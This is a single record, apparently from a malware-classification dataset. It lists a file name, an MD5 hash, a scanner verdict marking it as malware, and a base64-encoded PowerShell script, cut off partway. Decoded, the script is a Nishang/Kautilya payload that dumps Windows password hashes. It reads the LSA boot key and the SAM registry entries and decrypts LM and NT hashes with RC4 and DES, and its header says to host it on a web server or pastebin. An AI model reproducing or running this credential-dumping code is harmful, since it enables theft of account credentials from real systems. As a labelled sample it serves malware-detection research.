hashdump_download.ps1,851a2289e6283218bf4d8f2d5f5cc95c,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gaGFzaGR1bXBfZG93bmxvYWQgeyAKPCMgCi5TWU5PUFNJUyAKTmlzaGFuZyBwYXlsb2FkIG1vZGlmaWVkIGZvciBLYXV0aWx5YSB3aGljaCBkdW1wcyBwYXNzd29yZCBoYXNoZXMuIAogCi5ERVNDUklQVElPTiAKVGhpcyBpcyB0aGUgc2NyaXB0IHVzZWQgYnkgS2F1dGlseWEgcGF5bG9hZCAiaGFzaGR1bXBfcG93ZXJzaGVsbGRvd24iLiBQdXQgdGhpcyBzY3JpcHQgb24gYW55IHdlYiBzZXJ2ZXIgb3Igc2VydmljZSBsaWtlIHBhc3RlYmluIGFuZCB1c2UgdGhlIHVybCBpbiBLYXV0aWx5YS4gClRoZSBoYXNoZXMgYXJlIGR1bXBlZCB1c2luZyBhIG1vZGlmaWVkIHZlcnNpb24gb2YgcG93ZXJkdW1wIHNjcmlwdCBmcm9tIE1TRiB3cml0dGVuIGJ5IERhdmlkIEtlbm5lZHkuCkFkbWluaXN0cmF0b3IgcHJpdmlsZWdlcyBhcmUgcmVxdWlyZWQgZm9yIHRoaXMgc2NyaXB0CihidXQgbm90IFNZU1RFTSBwcml2cyBhcyBmb3IgdGhlIG9yaWdpbmFsIHBvd2VyZHVtcCkKCi5FWEFNUExFIApQUyA+IGhhCiAKLkxJTksgCmh0dHA6Ly93d3cubGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLzIwMTMvMDUvcG9zaGluZy1oYXNoZXMtcGFydC0yLmh0bWw/c2hvd0NvbW1lbnQ9MTM4NjcyNTg3NDE2NyNjODUxMzk4MDcyNTgyMzc2NDA2MApodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwoKIz4gCltDbWRsZXRCaW5kaW5nKCldClBhcmFtICgpCgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjcG93ZXJkdW1wIHdyaXR0ZW4gYnkgRGF2aWQgS2VubmVkeSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmZ1bmN0aW9uIExvYWRBcGkKewogICAgJG9sZEVycm9yQWN0aW9uID0gJGdsb2JhbDpFcnJvckFjdGlvblByZWZlcmVuY2U7CiAgICAkZ2xvYmFsOkVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICJTaWxlbnRseUNvbnRpbnVlIjsKICAgICR0ZXN0ID0gW1Bvd2VyRHVtcC5OYXRpdmVdOwogICAgJGdsb2JhbDpFcnJvckFjdGlvblByZWZlcmVuY2UgPSAkb2xkRXJyb3JBY3Rpb247CiAgICBpZiAoJHRlc3QpCiAgICB7CiAgICAgICAgIyBhbHJlYWR5IGxvYWRlZAogICAgICAgIHJldHVybjsKICAgICB9CgokY29kZSA9IEAnCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uVGV4dDsKCm5hbWVzcGFjZSBQb3dlckR1bXAKewogICAgcHVibGljIGNsYXNzIE5hdGl2ZQogICAgewogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IFJlZ09wZW5LZXlFeCgKICAgICAgICBpbnQgaEtleSwKICAgICAgICBzdHJpbmcgc3ViS2V5LAogICAgICAgIGludCB1bE9wdGlvbnMsCiAgICAgICAgaW50IHNhbURlc2lyZWQsCiAgICAgICAgb3V0IGludCBoa1Jlc3VsdCk7CgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgRW50cnlQb2ludCA9ICJSZWdFbnVtS2V5RXgiKV0KICAgIGV4dGVybiBwdWJsaWMgc3RhdGljIGludCBSZWdFbnVtS2V5RXgoCiAgICAgICAgaW50IGhrZXksCiAgICAgICAgaW50IGluZGV4LAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBOYW1lLAogICAgICAgIHJlZiBpbnQgbHBjYk5hbWUsCiAgICAgICAgaW50IHJlc2VydmVkLAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBDbGFzcywKICAgICAgICByZWYgaW50IGxwY2JDbGFzcywKICAgICAgICBvdXQgbG9uZyBscGZ0TGFzdFdyaXRlVGltZSk7CgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgRW50cnlQb2ludD0iUmVnUXVlcnlJbmZvS2V5IiwgQ2FsbGluZ0NvbnZlbnRpb249Q2FsbGluZ0NvbnZlbnRpb24uV2luYXBpLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICBleHRlcm4gcHVibGljIHN0YXRpYyBpbnQgUmVnUXVlcnlJbmZvS2V5KAogICAgICAgIGludCBoa2V5LAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBDbGFzcywKICAgICAgICByZWYgaW50IGxwY2JDbGFzcywKICAgICAgICBpbnQgbHBSZXNlcnZlZCwKICAgICAgICBvdXQgaW50IGxwY1N1YktleXMsCiAgICAgICAgb3V0IGludCBscGNiTWF4U3ViS2V5TGVuLAogICAgICAgIG91dCBpbnQgbHBjYk1heENsYXNzTGVuLAogICAgICAgIG91dCBpbnQgbHBjVmFsdWVzLAogICAgICAgIG91dCBpbnQgbHBjYk1heFZhbHVlTmFtZUxlbiwKICAgICAgICBvdXQgaW50IGxwY2JNYXhWYWx1ZUxlbiwKICAgICAgICBvdXQgaW50IGxwY2JTZWN1cml0eURlc2NyaXB0b3IsCiAgICAgICAgSW50UHRyIGxwZnRMYXN0V3JpdGVUaW1lKTsKCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgUmVnQ2xvc2VLZXkoCiAgICAgICAgaW50IGhLZXkpOwoKICAgICAgICB9CiAgICB9IC8vIGVuZCBuYW1lc3BhY2UgUG93ZXJEdW1wCgogICAgcHVibGljIGNsYXNzIFNoaWZ0IHsKICAgICAgICBwdWJsaWMgc3RhdGljIGludCAgIFJpZ2h0KGludCB4LCAgIGludCBjb3VudCkgeyByZXR1cm4geCA+PiBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgdWludCAgUmlnaHQodWludCB4LCAgaW50IGNvdW50KSB7IHJldHVybiB4ID4+IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyBsb25nICBSaWdodChsb25nIHgsICBpbnQgY291bnQpIHsgcmV0dXJuIHggPj4gY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIHVsb25nIFJpZ2h0KHVsb25nIHgsIGludCBjb3VudCkgeyByZXR1cm4geCA+PiBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgaW50ICAgIExlZnQoaW50IHgsICAgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyB1aW50ICAgTGVmdCh1aW50IHgsICBpbnQgY291bnQpIHsgcmV0dXJuIHggPDwgY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIGxvbmcgICBMZWZ0KGxvbmcgeCwgIGludCBjb3VudCkgeyByZXR1cm4geCA8PCBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgdWxvbmcgIExlZnQodWxvbmcgeCwgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9CiAgICB9CidACgogICAkcHJvdmlkZXIgPSBOZXctT2JqZWN0IE1pY3Jvc29mdC5DU2hhcnAuQ1NoYXJwQ29kZVByb3ZpZGVyCiAgICRkbGxOYW1lID0gW1BzT2JqZWN0XS5Bc3NlbWJseS5Mb2NhdGlvbgogICAkY29tcGlsZXJQYXJhbWV0ZXJzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29kZURvbS5Db21waWxlci5Db21waWxlclBhcmFtZXRlcnMKICAgJGFzc2VtYmxpZXMgPSBAKCJTeXN0ZW0uZGxsIiwgJGRsbE5hbWUpCiAgICRjb21waWxlclBhcmFtZXRlcnMuUmVmZXJlbmNlZEFzc2VtYmxpZXMuQWRkUmFuZ2UoJGFzc2VtYmxpZXMpCiAgICRjb21waWxlclBhcmFtZXRlcnMuR2VuZXJhdGVJbk1lbW9yeSA9ICR0cnVlCiAgICRjb21waWxlclJlc3VsdHMgPSAkcHJvdmlkZXIuQ29tcGlsZUFzc2VtYmx5RnJvbVNvdXJjZSgkY29tcGlsZXJQYXJhbWV0ZXJzLCAkY29kZSkKICAgaWYoJGNvbXBpbGVyUmVzdWx0cy5FcnJvcnMuQ291bnQgLWd0IDApIHsKICAgICAkY29tcGlsZXJSZXN1bHRzLkVycm9ycyB8ICUgeyBXcml0ZS1FcnJvciAoInswfTpgdHsxfSIgLWYgJF8uTGluZSwkXy5FcnJvclRleHQpIH0KICAgfQoKfQoKJGFudHBhc3N3b3JkID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiTlRQQVNTV09SRGAwIik7CiRhbG1wYXNzd29yZCA9IFtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoIkxNUEFTU1dPUkRgMCIpOwokZW1wdHlfbG0gPSBbYnl0ZVtdXUAoMHhhYSwweGQzLDB4YjQsMHgzNSwweGI1LDB4MTQsMHgwNCwweGVlLDB4YWEsMHhkMywweGI0LDB4MzUsMHhiNSwweDE0LDB4MDQsMHhlZSk7CiRlbXB0eV9udCA9IFtieXRlW11dQCgweDMxLDB4ZDYsMHhjZiwweGUwLDB4ZDEsMHg2YSwweGU5LDB4MzEsMHhiNywweDNjLDB4NTksMHhkNywweGUwLDB4YzAsMHg4OSwweGMwKTsKJG9kZF9wYXJpdHkgPSBAKAogIDEsIDEsIDIsIDIsIDQsIDQsIDcsIDcsIDgsIDgsIDExLCAxMSwgMTMsIDEzLCAxNCwgMTQsCiAgMTYsIDE2LCAxOSwgMTksIDIxLCAyMSwgMjIsIDIyLCAyNSwgMjUsIDI2LCAyNiwgMjgsIDI4LCAzMSwgMzEsCiAgMzIsIDMyLCAzNSwgMzUsIDM3LCAzNywgMzgsIDM4LCA0MSwgNDEsIDQyLCA0MiwgNDQsIDQ0LCA0NywgNDcsCiAgNDksIDQ5LCA1MCwgNTAsIDUyLCA1MiwgNTUsIDU1LCA1NiwgNTYsIDU5LCA1OSwgNjEsIDYxLCA2MiwgNjIsCiAgNjQsIDY0LCA2NywgNjcsIDY5LCA2OSwgNzAsIDcwLCA3MywgNzMsIDc0LCA3NCwgNzYsIDc2LCA3OSwgNzksCiAgODEsIDgxLCA4MiwgODIsIDg0LCA4NCwgODcsIDg3LCA4OCwgODgsIDkxLCA5MSwgOTMsIDkzLCA5NCwgOTQsCiAgOTcsIDk3LCA5OCwgOTgsMTAwLDEwMCwxMDMsMTAzLDEwNCwxMDQsMTA3LDEwNywxMDksMTA5LDExMCwxMTAsCiAgMTEyLDExMiwxMTUsMTE1LDExNywxMTcsMTE4LDExOCwxMjEsMTIxLDEyMiwxMjIsMTI0LDEyNCwxMjcsMTI3LAogIDEyOCwxMjgsMTMxLDEzMSwxMzMsMTMzLDEzNCwxMzQsMTM3LDEzNywxMzgsMTM4LDE0MCwxNDAsMTQzLDE0MywKICAxNDUsMTQ1LDE0NiwxNDYsMTQ4LDE0OCwxNTEsMTUxLDE1MiwxNTIsMTU1LDE1NSwxNTcsMTU3LDE1OCwxNTgsCiAgMTYxLDE2MSwxNjIsMTYyLDE2NCwxNjQsMTY3LDE2NywxNjgsMTY4LDE3MSwxNzEsMTczLDE3MywxNzQsMTc0LAogIDE3NiwxNzYsMTc5LDE3OSwxODEsMTgxLDE4MiwxODIsMTg1LDE4NSwxODYsMTg2LDE4OCwxODgsMTkxLDE5MSwKICAxOTMsMTkzLDE5NCwxOTQsMTk2LDE5NiwxOTksMTk5LDIwMCwyMDAsMjAzLDIwMywyMDUsMjA1LDIwNiwyMDYsCiAgMjA4LDIwOCwyMTEsMjExLDIxMywyMTMsMjE0LDIxNCwyMTcsMjE3LDIxOCwyMTgsMjIwLDIyMCwyMjMsMjIzLAogIDIyNCwyMjQsMjI3LDIyNywyMjksMjI5LDIzMCwyMzAsMjMzLDIzMywyMzQsMjM0LDIzNiwyMzYsMjM5LDIzOSwKICAyNDEsMjQxLDI0MiwyNDIsMjQ0LDI0NCwyNDcsMjQ3LDI0OCwyNDgsMjUxLDI1MSwyNTMsMjUzLDI1NCwyNTQKKTsKCmZ1bmN0aW9uIHNpZF90b19rZXkoJHNpZCkKewogICAgJHMxID0gQCgpOwogICAgJHMxICs9IFtjaGFyXSgkc2lkIC1iYW5kIDB4RkYpOwogICAgJHMxICs9IFtjaGFyXShbU2hpZnRdOjpSaWdodCgkc2lkLDgpIC1iYW5kIDB4RkYpOwogICAgJHMxICs9IFtjaGFyXShbU2hpZnRdOjpSaWdodCgkc2lkLDE2KSAtYmFuZCAweEZGKTsKICAgICRzMSArPSBbY2hhcl0oW1NoaWZ0XTo6UmlnaHQoJHNpZCwyNCkgLWJhbmQgMHhGRik7CiAgICAkczEgKz0gJHMxWzBdOwogICAgJHMxICs9ICRzMVsxXTsKICAgICRzMSArPSAkczFbMl07CiAgICAkczIgPSBAKCk7CiAgICAkczIgKz0gJHMxWzNdOyAkczIgKz0gJHMxWzBdOyAkczIgKz0gJHMxWzFdOyAkczIgKz0gJHMxWzJdOwogICAgJHMyICs9ICRzMlswXTsgJHMyICs9ICRzMlsxXTsgJHMyICs9ICRzMlsyXTsKICAgIHJldHVybiAsKChzdHJfdG9fa2V5ICRzMSksKHN0cl90b19rZXkgJHMyKSk7Cn0KCmZ1bmN0aW9uIHN0cl90b19rZXkoJHMpCnsKICAgICRrZXkgPSBAKCk7CiAgICAka2V5ICs9IFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzBdKSwgMSApOwogICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzBdKSAtYmFuZCAweDAxKSwgNikgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1sxXSksMik7CiAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbMV0pIC1iYW5kIDB4MDMpLCA1KSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzJdKSwzKTsKICAgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1syXSkgLWJhbmQgMHgwNyksIDQpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbM10pLDQpOwogICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzNdKSAtYmFuZCAweDBGKSwgMykgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1s0XSksNSk7CiAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbNF0pIC1iYW5kIDB4MUYpLCAyKSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzVdKSw2KTsKICAgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1s1XSkgLWJhbmQgMHgzRiksIDEpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbNl0pLDcpOwogICAgJGtleSArPSAkKFtpbnRdKCRzWzZdKSAtYmFuZCAweDdGKTsKICAgIDAuLjcgfCAlewogICAgICAgICRrZXlbJF9dID0gW1NoaWZ0XTo6TGVmdCgka2V5WyRfXSwgMSk7CiAgICAgICAgJGtleVskX10gPSAkb2RkX3Bhcml0eVska2V5WyRfXV07CiAgICAgICAgfQogICAgcmV0dXJuICwka2V5Owp9CgpmdW5jdGlvbiBOZXdSQzQoW2J5dGVbXV0ka2V5KQp7CiAgICByZXR1cm4gbmV3LW9iamVjdCBPYmplY3QgfAogICAgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkga2V5ICRrZXkgLVBhc3NUaHJ1IHwKICAgIEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5IFMgJG51bGwgLVBhc3NUaHJ1IHwKICAgIEFkZC1NZW1iZXIgU2NyaXB0TWV0aG9kIGluaXQgewogICAgICAgIGlmICgtbm90ICR0aGlzLlMpCiAgICAgICAgewogICAgICAgICAgICBbYnl0ZVtdXSR0aGlzLlMgPSAwLi4yNTU7CiAgICAgICAgICAgIDAuLjI1NSB8ICUgLWJlZ2lue1tsb25nXSRqPTA7fXsKICAgICAgICAgICAgICAgICRqID0gKCRqICsgJHRoaXMua2V5WyQoJF8gJSAkdGhpcy5rZXkuTGVuZ3RoKV0gKyAkdGhpcy5TWyRfXSkgJSAkdGhpcy5TLkxlbmd0aDsKICAgICAgICAgICAgICAgICR0ZW1wID0gJHRoaXMuU1skX107ICR0aGlzLlNbJF9dID0gJHRoaXMuU1skal07ICR0aGlzLlNbJGpdID0gJHRlbXA7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSAtUGFzc1RocnUgfAogICAgQWRkLU1lbWJlciBTY3JpcHRNZXRob2QgImVuY3J5cHQiIHsKICAgICAgICAkZGF0YSA9ICRhcmdzWzBdOwogICAgICAgICR0aGlzLmluaXQoKTsKICAgICAgICAkb3V0YnVmID0gbmV3LW9iamVjdCBieXRlW10gJCgkZGF0YS5MZW5ndGgpOwogICAgICAgICRTMiA9ICR0aGlzLlNbMC4uJHRoaXMuUy5MZW5ndGhdOwogICAgICAgIDAuLiQoJGRhdGEuTGVuZ3RoLTEpIHwgJSAtYmVnaW57JGk9MDskaj0wO30gewogICAgICAgICAgICAkaSA9ICgkaSsxKSAlICRTMi5MZW5ndGg7CiAgICAgICAgICAgICRqID0gKCRqICsgJFMyWyRpXSkgJSAkUzIuTGVuZ3RoOwogICAgICAgICAgICAkdGVtcCA9ICRTMlskaV07JFMyWyRpXSA9ICRTMlskal07JFMyWyRqXSA9ICR0ZW1wOwogICAgICAgICAgICAkYSA9ICRkYXRhWyRfXTsKICAgICAgICAgICAgJGIgPSAkUzJbICQoJFMyWyRpXSskUzJbJGpdKSAlICRTMi5MZW5ndGggXTsKICAgICAgICAgICAgJG91dGJ1ZlskX10gPSAoJGEgLWJ4b3IgJGIpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gLCRvdXRidWY7CiAgICB9IC1QYXNzVGhydQp9CgpmdW5jdGlvbiBkZXNfZW5jcnlwdChbYnl0ZVtdXSRkYXRhLCBbYnl0ZVtdXSRrZXkpCnsKICAgIHJldHVybiAsKGRlc190cmFuc2Zvcm0gJGRhdGEgJGtleSAkdHJ1ZSkKfQoKZnVuY3Rpb24gZGVzX2RlY3J5cHQoW2J5dGVbXV0kZGF0YSwgW2J5dGVbXV0ka2V5KQp7CiAgICByZXR1cm4gLChkZXNfdHJhbnNmb3JtICRkYXRhICRrZXkgJGZhbHNlKQp9CgpmdW5jdGlvbiBkZXNfdHJhbnNmb3JtKFtieXRlW11dJGRhdGEsIFtieXRlW11dJGtleSwgJGRvRW5jcnlwdCkKewogICAgJGRlcyA9IG5ldy1vYmplY3QgU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkRFU0NyeXB0b1NlcnZpY2VQcm92aWRlcjsKICAgICRkZXMuTW9kZSA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkVDQjsKICAgICRkZXMuUGFkZGluZyA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpOb25lOwogICAgJGRlcy5LZXkgPSAka2V5OwogICAgJGRlcy5JViA9ICRrZXk7CiAgICAkdHJhbnNmb3JtID0gJG51bGw7CiAgICBpZiAoJGRvRW5jcnlwdCkgeyR0cmFuc2Zvcm0gPSAkZGVzLkNyZWF0ZUVuY3J5cHRvcigpO30KICAgIGVsc2V7JHRyYW5zZm9ybSA9ICRkZXMuQ3JlYXRlRGVjcnlwdG9yKCk7fQogICAgJHJlc3VsdCA9ICR0cmFuc2Zvcm0uVHJhbnNmb3JtRmluYWxCbG9jaygkZGF0YSwgMCwgJGRhdGEuTGVuZ3RoKTsKICAgIHJldHVybiAsJHJlc3VsdDsKfQoKZnVuY3Rpb24gR2V0LVJlZ0tleUNsYXNzKFtzdHJpbmddJGtleSwgW3N0cmluZ10kc3Via2V5KQp7CiAgICBzd2l0Y2ggKCRLZXkpIHsKICAgICAgICAiSEtDUiIgeyAkbktleSA9IDB4ODAwMDAwMDB9ICNISyBDbGFzc2VzIFJvb3QKICAgICAgICAiSEtDVSIgeyAkbktleSA9IDB4ODAwMDAwMDF9ICNISyBDdXJyZW50IFVzZXIKICAgICAgICAiSEtMTSIgeyAkbktleSA9IDB4ODAwMDAwMDJ9ICNISyBMb2NhbCBNYWNoaW5lCiAgICAgICAgIkhLVSIgIHsgJG5LZXkgPSAweDgwMDAwMDAzfSAjSEsgVXNlcnMKICAgICAgICAiSEtDQyIgeyAkbktleSA9IDB4ODAwMDAwMDV9ICNISyBDdXJyZW50IENvbmZpZwogICAgICAgIGRlZmF1bHQgewogICAgICAgICAgICB0aHJvdyAiSW52YWxpZCBLZXkuIFVzZSBvbmUgb2YgdGhlIGZvbGxvd2luZyBvcHRpb25zIEhLQ1IsIEhLQ1UsIEhLTE0sIEhLVSwgSEtDQyIKICAgICAgICB9CiAgICB9CiAgICAkS0VZUVVFUllWQUxVRSA9IDB4MTsKICAgICRLRVlSRUFEID0gMHgxOTsKICAgICRLRVlBTExBQ0NFU1MgPSAweDNGOwogICAgJHJlc3VsdCA9ICIiOwogICAgW2ludF0kaGtleT0wCiAgICBpZiAoLW5vdCBbUG93ZXJEdW1wLk5hdGl2ZV06OlJlZ09wZW5LZXlFeCgkbmtleSwkc3Via2V5LDAsJEtFWVJFQUQsW3JlZl0kaGtleSkpCiAgICB7CiAgICAJJGNsYXNzVmFsID0gTmV3LU9iamVjdCBUZXh0LlN0cmluZ2J1aWxkZXIgMTAyNAogICAgCVtpbnRdJGxlbiA9IDEwMjQKICAgIAlpZiAoLW5vdCBbUG93ZXJEdW1wLk5hdGl2ZV06OlJlZ1F1ZXJ5SW5mb0tleSgkaGtleSwkY2xhc3NWYWwsW3JlZl0kbGVuLDAsW3JlZl0kbnVsbCxbcmVmXSRudWxsLAogICAgCQlbcmVmXSRudWxsLFtyZWZdJG51bGwsW3JlZl0kbnVsbCxbcmVmXSRudWxsLFtyZWZdJG51bGwsMCkpCiAgICAJewogICAgCQkkcmVzdWx0ID0gJGNsYXNzVmFsLlRvU3RyaW5nKCkKICAgIAl9CiAgICAJZWxzZQogICAgCXsKICAgIAkJV3JpdGUtRXJyb3IgIlJlZ1F1ZXJ5SW5mb0tleSBmYWlsZWQiOwogICAgCX0KICAgIAlbUG93ZXJEdW1wLk5hdGl2ZV06OlJlZ0Nsb3NlS2V5KCRoa2V5KSB8IE91dC1OdWxsCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAJV3JpdGUtRXJyb3IgIkNhbm5vdCBvcGVuIGtleSI7CiAgICB9CiAgICByZXR1cm4gJHJlc3VsdDsKfQoKZnVuY3Rpb24gR2V0LUJvb3RLZXkKewogICAgJHMgPSBbc3RyaW5nXTo6Sm9pbigiIiwkKCJKRCIsIlNrZXcxIiwiR0JHIiwiRGF0YSIgfCAle0dldC1SZWdLZXlDbGFzcyAiSEtMTSIgIlNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXExzYVwkXyJ9KSk7CiAgICAkYiA9IG5ldy1vYmplY3QgYnl0ZVtdICQoJHMuTGVuZ3RoLzIpOwogICAgMC4uJCgkYi5MZW5ndGgtMSkgfCAleyRiWyRfXSA9IFtDb252ZXJ0XTo6VG9CeXRlKCRzLlN1YnN0cmluZygkKCRfKjIpLDIpLDE2KX0KICAgICRiMiA9IG5ldy1vYmplY3QgYnl0ZVtdIDE2OwogICAgMHg4LCAweDUsIDB4NCwgMHgyLCAweGIsIDB4OSwgMHhkLCAweDMsIDB4MCwgMHg2LCAweDEsIDB4YywgMHhlLCAweGEsIDB4ZiwgMHg3IHwgJSAtYmVnaW57JGk9MDt9eyRiMlskaV09JGJbJF9dOyRpKyt9CiAgICByZXR1cm4gLCRiMjsKfQoKZnVuY3Rpb24gR2V0LUhCb290S2V5CnsKICAgIHBhcmFtKFtieXRlW11dJGJvb3RrZXkpOwogICAgJGFxd2VydHkgPSBbVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCIhQCMkJV4mKigpcXdlcnR5VUlPUEF6eGN2Ym5tUVFRUVFRUVFRUVFRKSgqQCYlYDAiKTsKICAgICRhbnVtID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiMDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OWAwIik7CiAgICAkayA9IEdldC1JdGVtIEhLTE06XFNBTVxTQU1cRG9tYWluc1xBY2NvdW50OwogICAgaWYgKC1ub3QgJGspIHtyZXR1cm4gJG51bGx9CiAgICBbYnl0ZVtdXSRGID0gJGsuR2V0VmFsdWUoIkYiKTsKICAgIGlmICgtbm90ICRGKSB7cmV0dXJuICRudWxsfQogICAgJHJjNGtleSA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1XTo6Q3JlYXRlKCkuQ29tcHV0ZUhhc2goJEZbMHg3MC4uMHg3Rl0gKyAkYXF3ZXJ0eSArICRib290a2V5ICsgJGFudW0pOwogICAgJHJjNCA9IE5ld1JDNCAkcmM0a2V5OwogICAgcmV0dXJuICwoJHJjNC5lbmNyeXB0KCRGWzB4ODAuLjB4OUZdKSk7Cn0KCmZ1bmN0aW9uIEdldC1Vc2VyTmFtZShbYnl0ZVtdXSRWKQp7CiAgICBpZiAoLW5vdCAkVikge3JldHVybiAkbnVsbH07CiAgICAkb2Zmc2V0ID0gW0JpdENvbnZlcnRlcl06OlRvSW50MzIoJFZbMHgwYy4uMHgwZl0sMCkgKyAweENDOwogICAgJGxlbiA9IFtCaXRDb252ZXJ0ZXJdOjpUb0ludDMyKCRWWzB4MTAuLjB4MTNdLDApOwogICAgcmV0dXJuIFtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJFYsICRvZmZzZXQsICRsZW4pOwp9CgpmdW5jdGlvbiBHZXQtVXNlckhhc2hlcygkdSwgW2J5dGVbXV0kaGJvb3RrZXkpCnsKICAgIFtieXRlW11dJGVuY19sbV9oYXNoID0gJG51bGw7IFtieXRlW11dJGVuY19udF9oYXNoID0gJG51bGw7CiAgICAKICAgICMgY2hlY2sgaWYgaGFzaGVzIGV4aXN0IChpZiBieXRlIG1lbW9yeSBlcXVhbHMgdG8gMjAsIHRoZW4gd2UndmUgZ290IGEgaGFzaCkKICAgICRMTV9leGlzdHMgPSAkZmFsc2U7CiAgICAkTlRfZXhpc3RzID0gJGZhbHNlOwogICAgIyBMTSBoZWFkZXIgY2hlY2sKICAgIGlmICgkdS5WWzB4YTAuLjB4YTNdIC1lcSAyMCkKICAgIHsKICAgICAgICAkTE1fZXhpc3RzID0gJHRydWU7CiAgICB9CiAgICAjIE5UIGhlYWRlciBjaGVjawogICAgZWxzZWlmICgkdS5WWzB4YWMuLjB4YWZdIC1lcSAyMCkKICAgIHsKICAgICAgICAkTlRfZXhpc3RzID0gJHRydWU7CiAgICB9CgogICAgaWYgKCRMTV9leGlzdHMgLWVxICR0cnVlKQogICAgewogICAgICAgICRsbV9oYXNoX29mZnNldCA9ICR1Lkhhc2hPZmZzZXQgKyA0OwogICAgICAgICRudF9oYXNoX29mZnNldCA9ICR1Lkhhc2hPZmZzZXQgKyA4ICsgMHgxMDsKICAgICAgICAkZW5jX2xtX2hhc2ggPSAkdS5WWyQoJGxtX2hhc2hfb2Zmc2V0KS4uJCgkbG1faGFzaF9vZmZzZXQrMHgwZildOwogICAgICAgICRlbmNfbnRfaGFzaCA9ICR1LlZbJCgkbnRfaGFzaF9vZmZzZXQpLi4kKCRudF9oYXNoX29mZnNldCsweDBmKV07CiAgICB9CgkKICAgIGVsc2VpZiAoJE5UX2V4aXN0cyAtZXEgJHRydWUpCiAgICB7CiAgICAgICAgJG50X2hhc2hfb2Zmc2V0ID0gJHUuSGFzaE9mZnNldCArIDg7CiAgICAgICAgJGVuY19udF9oYXNoID0gW2J5dGVbXV0kdS5WWyQoJG50X2hhc2hfb2Zmc2V0KS4uJCgkbnRfaGFzaF9vZmZzZXQrMHgwZildOwogICAgfQogICAgcmV0dXJuICwoRGVjcnlwdEhhc2hlcyAkdS5SaWQgJGVuY19sbV9oYXNoICRlbmNfbnRfaGFzaCAkaGJvb3RrZXkpOwp9CgpmdW5jdGlvbiBEZWNyeXB0SGFzaGVzKCRyaWQsIFtieXRlW11dJGVuY19sbV9oYXNoLCBbYnl0ZVtdXSRlbmNfbnRfaGFzaCwgW2J5dGVbXV0kaGJvb3RrZXkpCnsKICAgIFtieXRlW11dJGxtaGFzaCA9ICRlbXB0eV9sbTsgW2J5dGVbXV0kbnRoYXNoPSRlbXB0eV9udDsKICAgICMgTE0gSGFzaAogICAgaWYgKCRlbmNfbG1faGFzaCkKICAgIHsKICAgICAgICAkbG1oYXNoID0gRGVjcnlwdFNpbmdsZUhhc2ggJHJpZCAkaGJvb3RrZXkgJGVuY19sbV9oYXNoICRhbG